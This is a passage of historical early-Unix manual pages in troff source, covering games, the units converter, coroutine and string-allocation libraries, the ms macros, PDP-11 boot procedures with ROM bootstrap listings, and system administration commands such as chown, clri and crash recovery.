If no output file is specified, the standard output file
is assumed.
.sh FILES
.nf
\fIname\fB.s\fR: assembly language version of \fIname\fB.t\fR
/usr/lib/tmg: the compiler-compiler
/usr/lib/tmg[abc], /lib/libs.a: libraries
alloc.d: scratch file for table storage
.fi
.sh "SEE ALSO"
A Manual for the Tmg Compiler-writing Language,
internal memorandum.
.sh DIAGNOSTICS
Syntactic errors result in "???" followed by the
offending line.
.br
Situations such as space overflow
with which the Tmg processor or a Tmg-produced
processor can not cope result in a descriptive comment and 
a dump.
.sh AUTHOR
M. D. McIlroy
.sh BUGS
Footnote 1 of Section 9.2 of Tmg Manual is not enforced,
causing trouble.
.br
Restrictions (7.) against mixing bundling primitives
should be lifted.
.br
Certain hidden reserved words exist: gpar, classtab, trans,
goto, alt, salt.
.br
Octal digits include 8=10 and 9=11.
-- /usr/man/man6/ttt.6 mode=0100664 uid=3 gid=3 atime=170022382 mtime=173059782 --
.th TTT VI 11/1/73
.sh NAME
ttt \*- the game of tic-tac-toe
.sh SYNOPSIS
.bd /usr/games/ttt
.sh DESCRIPTION
.it Ttt
is the X and O game popular in the first grade.
This is a learning program that never makes the same
mistake twice.
.s3
Although it learns, it learns slowly.
It must lose nearly 80 games to
completely know the game.
.sh FILES
/usr/games/ttt.k	learning file
.sh BUGS
-- /usr/man/man6/units.6 mode=0100664 uid=3 gid=3 atime=170022383 mtime=173059782 --
.if n .ds / /
.if t .ds / \z/\h'\w'*'u'
.th UNITS VI 8/30/74
.sh NAME
units \*- conversion program
.sh SYNOPSIS
.it Units
converts quantities expressed
in various standard scales to
their equivalents in other scales.
It works interactively in this fashion:
.s3
.it "	You have:"
inch
.br
.it "	You want:"
cm
.br
.it "		* 2.54000e+00
.br
.it "		\*/ 3.93701e\-01
.s3
A quantity is specified as a multiplicative combination of
units optionally preceded by a numeric multiplier.
Powers are indicated by suffixed positive integers,
division by the usual sign:
.s3
.it "	You have:"
15 pounds force/in2
.br
.it "	You want:"
atm
.br
.it "		* 1.02069e+00"
.br
.it "		\*/ 9.79730e\-01"
.s3
.it Units 
only does multiplicative scale changes.
Thus it can convert Kelvin to Rankine, but not Centigrade to
Fahrenheit.
Most familiar units,
abbreviations, and metric prefixes are recognized,
together with a generous leavening of exotica
and a few constants of nature including:
.s3
.nf
	pi	ratio of circumference to diameter
	c	speed of light
	e	charge on an electron
	g	acceleration of gravity 
	force	same as g
	mole	Avogadro's number
	water	pressure head per unit height of water
	au	astronomical unit
.s3
.fi
`Pound' is a unit of
mass.
Compound names are run together, e.g. `lightyear'.
British units that differ from their US counterparts
are prefixed thus: `brgallon'.
For a complete list of units, `cat /usr/lib/units'.
.sh FILES
/usr/lib/units
.sh BUGS
-- /usr/man/man6/wump.6 mode=0100664 uid=3 gid=3 atime=170022384 mtime=173059782 --
.th WUMP VI 11/25/73
.sh NAME
wump \*- the game of hunt-the-wumpus
.sh SYNOPSIS
.bd /usr/games/wump
.sh DESCRIPTION
.it Wump
plays the game of ``Hunt the Wumpus.''
A Wumpus is a creature that lives in a cave with several rooms
connected by tunnels.
You wander among the rooms, trying to
shoot the Wumpus with an arrow, meanwhile avoiding
being eaten by the Wumpus and falling
into
Bottomless Pits.
There are also Super Bats which are likely to pick you up
and drop you in some random room.
.s3
The program asks various questions which you answer
one per line;
it will give a more detailed description
if you want.
.s3
This program is based on one described in
.it "People's Computer Company,"
.it 2,
2 (November 1973).
.sh BUGS
It will never replace Space War.
-- /usr/man/man7 mode=0140775 uid=3 gid=3 atime=173059787 mtime=173059709 --
-- /usr/man/man7/cr.7 mode=0110664 uid=3 gid=3 atime=170022386 mtime=173059788 --
.th CR VII 1/4/75
.sh NAME
crfork, crexit, crread, crwrite, crexch, crprior \*- coroutine scheme
.sh SYNOPSIS
.nf
.ft B
int crfork( \fR[\fB stack, nwords \fR]\fB )
int stack[];
int nwords;
.s3
crexit()
.s3
int crread(connector, buffer, nbytes)
int *connector[2];
char *buffer;
int nbytes;
.s3
crwrite(connector, buffer, nbytes)
int *connector[2];
char *buffer;
int nbytes;
.s3
crexch(conn1, conn2, i)
int *conn1[2], *conn2[2];
int i;
.s3
#define logical char *
crprior(p)
logical p;
.fi
.ft R
.sh DESCRIPTION
These functions are named by analogy to
.it "fork, exit, read, write"
(II).
They establish and synchronize `coroutines', which
behave in many respects like a set of processes working
in the same address space.
The functions live in
.it /usr/lib/cr.a.
.s3
Coroutines are placed
on queues to indicate their state of readiness.
One coroutine is always distinguished as `running'.
Coroutines that are runnable but not running
are registered on a `ready queue'.
The head member of the ready queue is started whenever no other
coroutine is specifically caused to be running.
.s3
Each connector heads two
queues: 
.it Connector[0]
is the queue of unsatisfied 
.it crreads
outstanding on the connector.
.it Connector[1]
is the queue of
.it crwrites.
All queues must start empty,
.it i.e.
with heads set to zero.
.s3
.it Crfork
is normally called with no arguments.
It
places the running coroutine at the head of
the ready queue, creates a new coroutine, and starts the new 
one running.
.it Crfork
returns immediately in the new coroutine with value 0,
and upon restarting of the old
coroutine with value 1.
.s3
.it Crexit
stops the running coroutine and does not place it in any queue.
.s3
.it Crread
copies characters from the
.it buffer
of the 
.it crwrite
at the head of the 
.it connector's
write queue to the 
.it buffer
of
.it crread.
If the write queue is empty, copying is delayed and the running
coroutine is placed on the read queue.
The number of characters copied is the minimum of
.it nbytes
and the number of characters remaining in the write
.it buffer,
and is returned as the value of
.it crread.
After copying, the location of the write
.it buffer
and the corresponding
.it nbytes
are updated appropriately.
If zero characters remain, the coroutine of the
.it crwrite
is moved to the head of the ready queue.
If the write queue remains nonempty,
the head member of the read queue is moved to
the head of the ready queue.
.s3
.it Crwrite
queues the running coroutine on the
.it connector's
write queue,
and records the fact that
.it nbytes
(zero or more)
characters in the string
.it buffer
are available to 
.it crreads.
If the read queue is not empty,
its head member is started running.
.s3
.it Crexch
exchanges the read queues of connectors
.it conn1
and
.it conn2
if
\fIi\fR=0; and it exchanges the write queues if
\fIi\fR=1.
If a nonempty read queue that had been paired with an empty write queue
becomes paired with a nonempty write queue,
.it crexch
moves
the head member of that read queue to the head
of the ready queue.
.s3
.it Crprior
sets a priority on the running coroutine to 
control the queuing of
.it crreads
and
.it crwrites.
When queued, the running coroutine will take its place before
coroutines whose priorities exceed
its own priority and after others.
Priorities are compared as logical,
.it i.e.
unsigned,
quantities.
Initially each coroutine's priority is set as large as possible,
so default queuing is
.nh
FIFO.
.hy
.s3
.bd "Storage allocation."
The old and new coroutine share the same activation record
in the function that invoked
.it crfork,
so only one may return from the invoking function,
and then only when the other has completed execution in that function.
.s3
The activation record for each function
execution is dynamically allocated rather than stacked;
a factor of 3 in running time overhead
can result if function calls are very frequent.
The overhead may be overcome by
providing a separate stack for each coroutine and dispensing with
dynamic allocation.
The base (lowest) address and size of the
new coroutine's stack are supplied to
.it crfork
as optional arguments
.it stack
and
.it nwords.
Stacked allocation and dynamic allocation cannot be mixed
in one run.
For stacked operation, obtain the coroutine functions from
.it /usr/lib/scr.a
instead of
.it /usr/lib/cr.a.
.sh FILES
/usr/lib/cr.a
.br
/usr/lib/scr.a
.sh DIAGNOSTICS
`rsave doesn't work' \*- an old C compilation
has called `rsave'.
It must be recompiled to work
with the coroutine scheme.
.sh BUGS
Under /usr/lib/cr.a
each function has just 12 words of anonymous
stack for hard expressions and arguments
of further calls, regardless of actual need.
There is no checking for stack overflow.
.br
Under /usr/lib/scr.a
stack overflow checking is not rigorous.
-- /usr/man/man7/ms.7 mode=0110664 uid=3 gid=3 atime=170022387 mtime=173059788 --
.hc %
.th MS VII 11/6/74
.sh NAME
ms \*- macros for formatting manuscripts
.sh SYNOPSIS
.bd "nroff \*-ms"
[ options ]
file ... 
.br
.bd "troff \*-ms"
[ options ]
file ... 
.sh DESCRIPTION
This package of 
.it nroff
and
.it troff
macro definitions provides a canned formatting
.li
facility for tech%nical papers.
When producing 2-column output on a terminal, its
output should be filtered through
.it col
(I).
.s3
The package supports three different formats:
BTL technical memorandum with cover sheet,
released paper with cover sheet,
and an abbreviated `debugging' form without
cover sheet.
.s3
The macro requests are defined in the attached
Request Reference.
Many
.it nroff
and
.it troff
requests are unsafe in conjunction with
this package, however the requests listed below may be used with
impunity after the first .PP.
.s3
.lp +8 0
.ta 5n
.nf
.li
.bp	begin new page
.li
.br	break output line here
.li
.sp n	insert n spacing lines
.li
.ls n	(line spacing) n=1 single, n=2 double space
.li
.na	no alignment of right margin
.fi
.i0
.s3
Output of the
.it eqn,
.it neqn
and
.it tbl
(I) preprocessors
for equations and tables is acceptable as input.
.sh FILES
/usr/lib/tmac.s
.sh "SEE ALSO"
eqn (I), nroff (I), troff (I), tbl (VI)
.sh BUGS
.bp
.in0
.tr &.
.in0
.ce
REQUEST REFERENCE
.if t .ta .75i 1.5i 2i
.if n .ta 10 18 24
.if t .in 2i
.if n .in 23
.if n .na
.s3
.ti0
Request	Initial	Cause
.ti0
Form	Value	Break	Explanation
.ps 9
.vs 11p
.s3
.ti0
.li
.1C	yes	yes	One column format on a new page.
.ti0
.li
.2C	no	yes	Two column format.
.ti0
.li
.AB	no	yes	Begin abstract.
.ti0
.li
.AE	-	yes	End abstract.
.ti0
.li
.AI	no	yes	Author's institution follows.
Suppressed in TM.
.ti0
.li
.AU \fIx y\fR	no	yes	Author's name follows.
\fIx\fR is location and \fIy\fR is
extension, ignored except in TM.
.ti0
.li
.B	no	no	Boldface text follows.
.ti0
.li
.CS \fIx...\fR	-	yes	Cover sheet info if
TM format, suppressed otherwise.
Arguments are number of text pages,
other pages, total pages, figures, tables, references.
.ti0
.li
.DA \fIx\fR	nroff	no	`Date line' at bottom of page
is \fIx\fR.
Default is today.
.ti0
.li
.DE	-	yes	End displayed text.
Implies .KE.
.ti0
.li
.DS \fIx\fR	no	yes	Start of displayed text,
to appear verbatim line-by-line.
\fIx\fR=I for indented display (default),
\fIx\fR=L for left-justified on the page,
\fIx\fR=C for centered.
Implies .KS.
.ti0
.li
.EN	-	yes	Space after equation
produced by
.it eqn
or
.it neqn.
.ti0
.li
.EQ \fIx\fR	-	yes	Space before
equation.
Equation number is \fIx\fR.
.ti0
.li
.FE	-	yes	End footnote.
.ti0
.li
.FS	no	no	Start footnote.
The note will be moved to the bottom of the page.
.ti0
.li
.HO	-	no	`Bell Laboratories, Holmdel,
New Jersey 07733'.
.ti0
.li
.I	no	no	Italic text follows.
.ti0
.li
.IP \fIx y\fR	no	yes	Start indented paragraph,
with hanging tag \fIx\fR.
Indentation is \fIy\fR ens (default 5).
.ti0
.li
.KE	-	yes	End keep.
Put kept text on next page if not enough room.
.ti0
.li
.KF	no	yes	Start floating keep.
If the kept text must be moved to the next page,
float later text back to this page.
.ti0
.li
.KS	no	yes	Start keeping following text.
.ti0
.li
.LG	no	no	Make letters larger.
.ti0
.li
.LP	yes	yes	Start left-blocked paragraph.
.ti0
.li
.MH	-	no	`Bell Laboratories, Murray Hill,
New Jersey 07974'.
.ti0
.li
.ND	troff	no	No date line at bottom of page.
.ti0
.li
.NH \fIn\fR	-	yes	Same as .SH, with section
number supplied automatically.
Numbers are multilevel, like 1.2.3,
where \fIn\fR tells what level is wanted (default is 1).
.ti0
.li
.NL	yes	no	Make letters normal size.
.ti0
.li
.OK	-	yes	`Other keywords' for TM cover
sheet follow.
.ti0
.li
.PP	no	yes	Begin paragraph.
First line indented.
.ti0
.li
.R	yes	no	Roman text follows.
.ti0
.li
.RE	-	yes	End relative indent level.
.ti0
.li
.RP	no	-	Cover sheet and first page for released
paper.
Must precede other requests.
.ti0
.li
.RS	-	yes	Start level of relative indentation.
Following .IP's measured from current indentation.
.ti0
.li
.SG \fIx\fR	no	yes	Insert signature(s) of author(s),
ignored except in TM.
\fIx\fR is the reference line (initials of author and typist).
.ti0
.li
.SH	-	yes	Section head follows,
font automatically bold.
.ti0
.li
.SM	no	no	Make letters smaller.
.ti0
.li
.TL	no	yes	Title follows.
.ti0
.li
.TM \fIx y z\fR	no	-	BTL TM cover sheet and first page,
\fIx\fR=TM number, \fIy\fR=(quoted list of) case number(s),
\fIz\fR=file number.
Must precede other requests.
.ti0
.li
.WH	-	no	`Bell Laboratories, Whippany,
New Jersey 07981'.
-- /usr/man/man7/plot.7 mode=0100664 uid=3 gid=3 atime=170022388 mtime=173059788 --
.th PLOT VII 2/25/75
.sh NAME
plot: openpl et al. \*- graphics interface
.sh SYNOPSIS
.nf
.ft B
openpl( )
.s3
erase( )
.s3
label(s)
char s[ ];
.s3
line(x1, y1, x2, y2)
.s3
circle(x, y, r)
.s3
arc(x, y, x0, y0, x1, y1)
.s3
dot(x, y, dx, n, pattern)
int pattern[ ];
.s3
move(x, y)
.s3
point(x, y)
.s3
linemod(s)
char s[ ];
.s3
space(x0, y0, x1, y1)
.s3
closepl( )
.fi
.s3
.ft R
.sh DESCRIPTION
These subroutines
generate
graphic output in a relatively
device-independent manner.
See
.it plot
(VI)
for a description
of the meaning of the subroutines.
.s3
There are four libraries containing these routines,
one that produces general graphics commands on the standard output,
and one each for the vt0 storage scope, the Diablo plotting
terminal and the Tektronix 4014 terminal.
.it Openpl
must be used before any of the others to open the
device for writing.
.it Closepl
flushes the output.
.sh FILES
/usr/lib/plot.a	produces output for plotting filters
.br
/usr/lib/vt0.a	produces output on vt0 storage scope
.br
/usr/lib/gsip.a	produces output on Diablo terminal
.br
/usr/lib/tek.a	produces output for the Tektronix 4014 terminal
.sh "SEE ALSO"
plot (VI), graph (VI)
.sh BUGS
-- /usr/man/man7/salloc.7 mode=0110664 uid=3 gid=3 atime=170022389 mtime=173059788 --
.th SALLOC VII 6/15/72
.sh NAME
salloc \*- string allocation and manipulation
.sh SYNOPSIS
.nf
(get size in r0)
.bd "jsr	pc,allocate"
(header address in r1)
.s3
(get source header address in r0,
destination header address in r1)
.bd "jsr	pc,copy"
.s3
.bd "jsr	pc,wc"
.s3
(all following routines assume r1 contains header address)
.s3
.bd "jsr	pc,release"
.s3
(get character in r0)
.bd "jsr	pc,putchar"
.s3
.bd "jsr	pc,lookchar"
(character in r0)
.s3
.bd "jsr	pc,getchar"
(character in r0)
.s3
(get character in r0)
.bd "jsr	pc,alterchar"
.s3
(get position in r0)
.bd "jsr	pc,seekchar"
.s3
.bd "jsr	pc,backspace"
(character in r0)
.s3
(get word in r0)
.bd "jsr	pc,putword"
.s3
.bd "jsr	pc,lookword"
(word in r0)
.s3
.bd "jsr	pc,getword"
(word in r0)
.s3
(get word in r0)
.bd "jsr	pc,alterword"
.s3
.bd "jsr	pc,backword"
(word in r0)
.s3
.bd "jsr	pc,length"
(length in r0)
.s3
.bd "jsr	pc,position"
(position in r0)
.s3
.bd "jsr	pc,rewind"
.s3
.bd "jsr	pc,create"
.s3
.bd "jsr	pc,fsfile"
.s3
.bd "jsr	pc,zero"
.fi
.sh DESCRIPTION
This package is a complete set of routines
for dealing with almost arbitrary
length strings of words and bytes.
It lives in
.it /lib/libs.a.
The strings are stored on a disk file, so the sum of
their lengths can be considerably larger than
the available core.
A small buffer cache makes for reasonable speed.
.s3
For each string there is a header of four words, namely
a write pointer, a read pointer and pointers to the beginning and end of
the block containing the string.
Initially the read and write pointers point to the beginning of the string.
All routines that refer to a string require the header address in r1.
Unless the string is destroyed by the call,
upon return r1 will point to the same string, although
the string may have grown to the extent that it had to be
be moved.
.s3
.it Allocate
obtains a string of the requested size and returns
a pointer to its header in r1.
.s3
.it Release
releases a string back to free storage.
.s3
.it Putchar
and
.it putword
write a byte or word respectively into the string
and advance the write pointer.
.s3
.it Lookchar
and
.it lookword
read
a byte or word respectively from the string but do not advance the read pointer.
.s3
.it Getchar
and
.it getword
read a byte or word respectively from the string and advance the read pointer.
.s3
.it Alterchar
and
.it alterword
write a byte or word respectively into the string where the read pointer
is pointing and advance the read pointer.
.s3
.it Backspace
and
.it backword
read the last byte or word written and decrement the write pointer.
.s3
All write operations will automatically get a larger block if the current block is exceeded.
All read operations return with the error bit set if attempting to read beyond the write pointer.
.s3
.it Seekchar
moves the read pointer to the offset specified in r0.
.s3
.it Length
returns the current length of the string (beginning pointer to write pointer) in r0.
.s3
.it Position
returns the current offset of the read pointer in r0.
.s3
.it Rewind
moves the read pointer to the beginning of the string.
.s3
.it Create
returns the read and write pointers to the beginning of the string.
.s3
.it Fsfile
moves the read pointer to the current position of the write pointer.
.s3
.it Zero
zeros the whole string and sets the write pointer to the beginning of the string.
.s3
.it Copy
copies the string whose header pointer is in r0 to the string whose header pointer is in
r1.
Care should be taken in using the copy instruction since r1 will be changed if the contents of the source string
is bigger than the destination string.
.s3
.it Wc
forces the contents of the internal buffers and the header blocks to be written on disc.
.s3
An in-core version of this allocator exists in
.it dc
(I),
and a permanent-file version exists in
.it form
and 
.it fed
(VI).
.sh FILES
.if t .ta 1i
.if n .ta 13
/lib/libs.a	library, accessed by
.it "ld ... -ls"
.br
alloc.d	temporary file for string storage
.sh "SEE ALSO"
alloc (III)
.sh DIAGNOSTICS
`error in copy' \*- disk write error encountered in
.it copy.
.br
`error in allocator' \*- routine called with bad header pointer.
.br
`cannot open output file' \*- temp file 
.it alloc.d 
cannot be created or opened.
.br
`out of space' \*- no sufficiently large block or no 
header is available for a new or growing block.
.sh BUGS
-- /usr/man/man8 mode=0140775 uid=3 gid=3 atime=173059798 mtime=173059709 --
-- /usr/man/man8/ac.8 mode=0100664 uid=3 gid=3 atime=170022391 mtime=173059799 --
.th AC VIII 2/20/74
.sh NAME
ac \*- login accounting
.sh SYNOPSIS
.bd ac
[
.bd \*-w
wtmp ] [
.bd \*-p
] [
.bd \*-d
] people
.sh DESCRIPTION
.it Ac
produces a printout giving
connect time
for each user who has logged in
during the life of the current
.it wtmp
file.
A total is also produced.
.bd \*-w
is used to specify an alternate \fIwtmp\fR file.
.bd \*-p
prints individual totals; without this option,
only totals are printed.
.bd \*-d
causes a printout for each midnight to midnight
period.
Any
.it people
will limit the
printout to only the specified login names.
If no \fIwtmp\fR file is given,
.it /usr/adm/wtmp
is used.
.s3
The accounting file
.it /usr/adm/wtmp
is maintained by
.it init
and
.it login.
Neither of these programs creates the file,
so if it does not exist
no connect-time accounting is done.
To start accounting, it should be created with length 0.
On the other hand if the file is left undisturbed it will
grow without bound, so periodically any information
desired should be collected and the file truncated.
.sh FILES
/usr/adm/wtmp
.sh "SEE ALSO"
init (VIII), login (I), wtmp (V).
.sh BUGS
-- /usr/man/man8/bproc.8 mode=0110664 uid=3 gid=3 atime=170022392 mtime=173059799 --
.tr |
.th "BOOT PROCEDURES" VIII 2/11/75
.sh NAME
boot procedures \*- UNIX startup
.sh DESCRIPTION
.it "How to start UNIX.||"
UNIX is started by placing it in core
at location zero and transferring to zero.
Since the system is not reenterable,
it is necessary to read it in from disk or tape.
.s3
The
.it tp
command places a bootstrap program
on the
otherwise unused block zero of the tape.
The DECtape version of this program is
called
.it tboot,
the magtape version
.it mboot.
If
.it tboot
or
.it mboot
is read into location zero and
executed there,
it will type `=' on the console,
read in a
.it tp
entry name,
load that entry into core,
and transfer to zero.
Thus one way to run UNIX
is to maintain the system code on a tape using
.it tp.
Caution: the file /usr/mdec/tboot
(DECtape)
or /usr/mdec/mboot
(magtape)
must be present when the tape is made!
When a boot is required,
execute (somehow) a program
which reads in and jumps to
the first block of the tape.
In response to the `='
prompt,
type the entry name of the system on the tape
(we use plain `unix').
It is strongly recommended that a current version of
the system be maintained in this way,
even if it is usually booted from disk.
.s3
The standard
DEC ROM which loads DECtape is sufficient to
read in
.it tboot,
but the
magtape ROM loads block one, not zero.
If no suitable ROM is available,
magtape and DECtape programs are presented below which may be
manually placed in core and executed.
.s3
The system can also be booted from a disk file
with the aid of the
.it uboot
program.
When read into location 0 and executed,
.it uboot
reads a single character (either
.bd p
or
.bd k
for RP or RK, both drive 0)
to specify which device is to be
searched.
Then it
reads a UNIX pathname from the console,
finds the corresponding file on the given device,
loads that file into core location zero,
and transfers to it.
.it Uboot
operates under very
severe space constraints.
It supplies no prompts, except that it
echoes a carriage return and line feed after the
.bd p
or
.bd k.
No diagnostic is provided if the indicated file cannot be found,
nor is there any means of correcting typographical errors in the
file name except to start the program over.
If it fails to find the file, however,
it jumps back to its start,
so another try
can be attempted,
starting again with the
.bd p
or
.bd k.
Notice that
.it uboot
will only load a file from drive 0,
and the file system it searches must start
at the beginning of the disk.
.it Uboot
itself usually resides in the otherwise unused
block 0
of the disk,
so it can be loaded by ROM program;
.it mkfs
can be used to put it there when the file system is created.
It can also be loaded from a
.it tp
tape as described above.
.s3
.it "The switches.||"
The console switches play an important role in the
use and especially the booting of UNIX.
During operation,
the console switches are
examined 60 times per second,
and the contents of the address specified by the switches
are displayed in the display register.
(This is not true on the 11/40
since there is no display register on that machine.)
If the switch address is even,
the address is interpreted in kernel (system)
space;
if odd,
the rounded-down address is interpreted in
the current user space.
.s3
If any diagnostics are produced by the system,
they are printed on the console only if
the switches are non-zero.
Thus it is wise to have a non-zero value in the
switches at all times.
.s3
During the startup of the
system,
the
.it init
program (VIII)
reads the switches and
will come up single-user
if the switches are set to 173030.
.s3
It is unwise to have a non-existent address in the
switches.
This causes a bus error in the system
(displayed as 177777)
at the rate of 60 times per second.
If there is a transfer of more than
16ms duration on a device with a data rate
faster than the bus error timeout
(about 10\*us)
then a permanent disk non-existent-memory error will occur.
.s3
.it "ROM programs.||"
Here are some programs which are suitable for
installing in read-only memories,
or for manual keying into core
if no ROM is present.
Each program is position-independent
but should be placed well above location 0
so it will not be overwritten.
Each reads a block from the
beginning of a device into core location
zero.
The octal words constituting the program are
listed on the left.
.s3
.ne 5
.nf
DECtape (drive 0) from endzone:
.if n .ta 3 11 15 23 38
.if t .ta .3i 1i 1.4i 2i 3.5i
	012700		mov	$tcba,r0
	177346
	010040		mov	r0,\*-(r0)  	/ use tc addr for wc
	012710		mov	$3,(r0)	/ read bn forward
	000003
	105710	1:	tstb	(r0)	/ wait for ready
	002376		bge	1b
	112710		movb	$5,(r0)	/ read (forward)
	000005
	000777		br	\fB.\fR	/ loop; now halt and start at 0
.s3
DECtape (drive 0) with search:
	012700	1:	mov	$tcba,r0
	177346
	010040		mov	r0,\*-(r0)  	/ use tc addr for wc
	012740		mov	$4003,\*-(r0)	/ read bn reverse
	004003
	005710	2:	tst	(r0)
	002376		bge	2b	/ wait for error
	005760		tst	\*-2(r0)	/ loop if not end zone
	177776
	002365		bge	1b
	012710		mov	$3,(r0)	/ read bn forward
	000003
	105710	2:	tstb	(r0)	/ wait for ready
	002376		bge	2b
	112710		movb	$5,(r0)	/ read (forward)
	000005
	105710	2:	tstb	(r0)	/ wait for ready
	002376		bge	2b
	005007		clr	pc	/ transfer to zero
.s3
.fi
Caution: both of these DECtape programs will (literally) blow a fuse
if 2 drives are dialed to zero.
.s3
.nf
Magtape from load point:
	012700		mov	$mtcma,r0
	172526
	010040		mov	r0,\*-(r0)	/ usr mt addr for wc
	012740		mov	$60003,\*-(r0)	/ read 9\*-track
	060003
	000777		br	\fB.\fR	/ loop; now halt and start at 0
.s3
RK (drive 0):
	012700		mov	$rkda,r0
	177412
	005040		clr	\*-(r0)	/ rkda cleared by start
	010040		mov	r0,\*-(r0)
	012740		mov	$5,\*-(r0)
	000005
	105710	1:	tstb	(r0)
	002376		bge	1b
	005007		clr	pc
.s3
.ne 11
RP (drive 0)
	012700		mov	$rpmr,r0
	176726
	005040		clr	\*-(r0)
	005040		clr	\*-(r0)
	005040		clr	\*-(r0)
	010040		mov	r0,\*-(r0)
	012740		mov	$5,\*-(r0)
	000005
	105710	1:	tstb	(r0)
	002376		bge	1b
	005007		clr	pc
.dt
.sh FILES
/unix \*- UNIX code
.br
/usr/mdec/mboot \*- \fItp\fR magtape bootstrap
.br
/usr/mdec/tboot \*- \fItp\fR DECtape bootstrap
.br
/usr/mdec/uboot \*- file system bootstrap
.sh "SEE ALSO"
tp (I), init (VIII)
-- /usr/man/man8/chgrp.8 mode=0100664 uid=3 gid=3 atime=170022393 mtime=173059799 --
.th CHGRP VIII 2/8/75
.sh NAME
chgrp \*- change group
.sh SYNOPSIS
.bd chgrp
group file ...
.sh DESCRIPTION
The group-ID of the files is changed to
.it group.
The group may be either a decimal GID or
a group name found in the group-ID file.
.s3
Only the super-user is allowed to change the group of a file,
in order to simplify as yet unimplemented accounting procedures.
.sh "SEE ALSO"
chown (VIII)
.sh FILES
/etc/group
.sh BUGS
-- /usr/man/man8/chown.8 mode=0100664 uid=3 gid=3 atime=170022394 mtime=173059799 --
.th CHOWN VIII 2/8/75
.sh NAME
chown \*- change owner
.sh SYNOPSIS
.bd chown
owner file ...
.sh DESCRIPTION
The user-ID of the files is changed to
.it owner.
The owner may be either a decimal UID or
a login name found in the password file.
.s3
Only the super-user is allowed to change the owner of a file,
in order to simplify as yet unimplemented accounting procedures.
.sh FILES
/etc/passwd
.sh "SEE ALSO"
chgrp (VIII)
.sh BUGS
-- /usr/man/man8/clri.8 mode=0100664 uid=3 gid=3 atime=170022394 mtime=173059799 --
.th CLRI VIII 10/31/73
.sh NAME
clri \*- clear i-node
.sh SYNOPSIS
.bd clri
i-number [ filesystem ]
.sh DESCRIPTION
.it Clri
writes zeros on the 32 bytes occupied by the i-node
numbered
.it i-number.
If the
.it "file system"
argument is given, the i-node resides on
the given device, otherwise on a
default file system.
The file system argument
must be a special file
name referring to a device
containing a file system.
After
.it clri,
any blocks
in the affected file
will show up as ``missing'' in an
.it icheck
of
of the file system.
.s3
Read and write permission is required on the specified
file system device.
The i-node becomes allocatable.
.s3
The primary purpose of this routine
is to remove a file which
for some reason appears in no
directory.
If it is used to zap an i-node
which does appear in a directory, care should be taken to track down
the entry and remove it.
Otherwise, when the i-node is reallocated to some new file,
the old entry will still point to that file.
At that point removing the old entry will destroy the new file.
The new entry will again point to an unallocated i-node,
so the whole cycle is likely to be repeated again and again.
.sh BUGS
Whatever the default file system is,
it is likely to be wrong.
Specify the file system explicitly.
.s3
If the file is open,
.it clri
is likely to be ineffective.
-- /usr/man/man8/crash.8 mode=0110664 uid=3 gid=3 atime=170022396 mtime=173059799 --
.th CRASH VIII 2/12/75
.tr |
.sh NAME
crash \*- what to do when the system crashes
.sh DESCRIPTION
This section gives at least a few clues about how to proceed if the
system crashes.
It can't pretend to be complete.
.s3
.it "How to bring it back up.||"
If the reason for the crash is not evident
(see below for guidance on `evident')
you may want to try to dump the system if you feel up to
debugging.
At the moment a dump can be taken only on magtape.
With a tape mounted and ready,
stop the machine, load address 44, and start.
This should write a copy of all of core
on the tape with an EOF mark.
Caution:
Any error is taken to mean the end of core has been reached.
This means that you must be sure the ring is in,
the tape is ready, and the tape is clean and new.
If the dump fails, you can try again,
but some of the registers will be lost.
See below for what to do with the tape.
.s3
In restarting after a crash,
always bring up the system single-user.
This is accomplished by following the directions in
.it "boot procedures"
(VIII)
as modified for your particular installation;
a single-user system is indicated by having a particular value
in the switches (173030 unless you've changed
.it init)
as the system starts executing.
When it is running,
perform a
.it dcheck
and
.it icheck
(VIII)
on all file systems which could have been in use at the time
of the crash.
If any serious file system problems are found, they should be repaired.
When you are satisfied with the health of your disks,
check and set the date if necessary,
then come up multi-user.
This is most easily accomplished by changing the
single-user value in the switches to something else,
then logging out
by typing an EOT.
.s3
To even boot \s8UNIX\s10 at all,
three files (and the directories leading to them)
must be intact.
First,
the initialization program
.it /etc/init
must be present and executable.
If it is not,
the CPU will loop in user mode at location 6.
For
.it init
to work correctly,
.it /dev/tty8
and
.it /bin/sh
must be present.
If either does not exist,
the symptom is best described
as thrashing.
.it Init
will go into a
.it fork/exec
loop trying to create a
Shell with proper standard input and output.
.s3
If you cannot get the system to boot,
a runnable system must be obtained from
a backup medium.
The root file system may then be doctored as
a mounted file system as described below.
If there are any problems with the root
file system,
it is probably prudent to go to a
backup system to avoid working on a
mounted file system.
.s3
.it "Repairing disks.||"
The first rule to keep in mind is that an addled disk
should be treated gently;
it shouldn't be mounted unless necessary,
and if it is very valuable yet
in quite bad shape, perhaps it should be dumped before
trying surgery on it.
This is an area where experience and informed courage count for much.
.s3
The problems reported by
.it icheck
typically fall into two kinds.
There can be
problems with the free list:
duplicates in the free list, or free blocks also in files.
These can be cured easily with an
.it "icheck \*-s."
If the same block appears in more than one file
or if a file contains bad blocks,
the files should be deleted, and the free list reconstructed.
The best way to delete such a file is to use
.it clri
(VIII),
then remove its directory entries.
If any of the affected files is really precious,
you can try to copy it to another device
first.
.s3
.it Dcheck
may report files which
have more directory entries than links.
Such situations are potentially dangerous;
.it clri
discusses a special case of the problem.
All the directory entries for the file should be removed.
If on the other hand there are more links than directory entries,
there is no danger of spreading infection, but merely some disk space
that is lost for use.
It is sufficient to copy the file (if it has any entries and is useful)
then use
.it clri
on its inode and remove any directory
entries that do exist.
.s3
Finally,
there may be inodes reported by
.it dcheck
that have 0 links and 0 entries.
These occur on the root device when the system is stopped
with pipes open, and on other file systems when the system
stops with files that have been deleted while still open.
A
.it clri
will free the inode, and an
.it "icheck -s"
will
recover any missing blocks.
.s3
.it "Why did it crash?||"
UNIX types a message
on the console typewriter when it voluntarily crashes.
Here is the current list of such messages,
with enough information to provide
a hope at least of the remedy.
The message has the form `panic: ...',
possibly accompanied by other information.
Left unstated in all cases
is the possibility that hardware or software
error produced the message in some unexpected way.
.s3
.lp +5 5
blkdev
.br
The
.it getblk
routine was called with a nonexistent major device as argument.
Definitely hardware or software error.
.s3
.lp +5 5
devtab
.br
Null device table entry for the major device used as argument to
.it getblk.
Definitely hardware or software error.
.s3
.lp +5 5
iinit
.br
An I/O error reading the super-block for the root file system
during initialization.
.s3
.lp +5 5
out of inodes
.br
A mounted file system has no more i-nodes when creating a file.
Sorry, the device isn't available;
the
.it icheck
should tell you.
.s3
.lp +5 5
no fs
.br
A device has disappeared from the mounted-device table.
Definitely hardware or software error.
.s3
.lp +5 5
no imt
.br
Like `no fs', but produced elsewhere.
